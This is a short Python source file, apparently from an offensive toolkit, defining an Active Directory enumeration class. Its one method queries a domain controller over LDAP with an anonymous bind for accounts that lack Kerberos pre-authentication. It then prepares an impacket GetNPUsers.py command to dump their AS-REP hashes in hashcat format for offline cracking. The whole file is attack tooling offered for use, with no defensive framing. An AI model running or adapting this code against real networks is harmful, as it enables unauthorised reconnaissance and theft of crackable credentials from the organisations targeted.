import subprocess
import re

class ADEnumerator:
    def enumerate(self, dc_ip):
        info = {}
        domain = "domain.local"  # Asumido; en la práctica, se extrae
        try:
            # AS-REP Roasting
            result = subprocess.run([
                'ldapsearch', '-x', '-H', f'ldap://{dc_ip}',
                '-b', f'dc={domain.replace(".",",dc=")}',
                '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304))',
                'sAMAccountName'
            ], capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                users = re.findall(r'sAMAccountName: (\w+)', result.stdout)
                if users:
                    info['as_rep_roastable'] = users
                    info['as_rep_command'] = f"GetNPUsers.py {domain}/ -usersfile /tmp/asrep_users.txt -format hashcat"
        except Exception:
            pass
        return info